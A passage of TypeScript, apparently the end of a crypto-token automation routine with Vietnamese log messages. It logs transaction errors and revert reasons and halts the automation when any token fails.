            onLog(`=== ✗ Token "${token.name}" thất bại tại step ${currentStep + 1} ===`)
            onLog(`    code   : ${err.code || 'n/a'}`)
            onLog(`    reason : ${err.reason || 'n/a'}`)
            onLog(`    message: ${err.message || 'n/a'}`)
            if (err.transactionHash || err.receipt?.transactionHash) {
                onLog(`    tx     : ${err.transactionHash || err.receipt?.transactionHash}`)
            }
            if (err.transaction) {
                try {
                    await provider.call(err.transaction)
                } catch (callErr: any) {
                    const revert = callErr.reason || callErr.error?.message || callErr.message || ''
                    if (revert) onLog(`    revert : ${revert}`)
                }
            }
            updateStatus(token.id, 'error', undefined, errMsg)
            break // dừng toàn bộ automation khi bất kỳ token nào lỗi
        }
    }

    onLog('\n✓ Automation hoàn thành!')
}
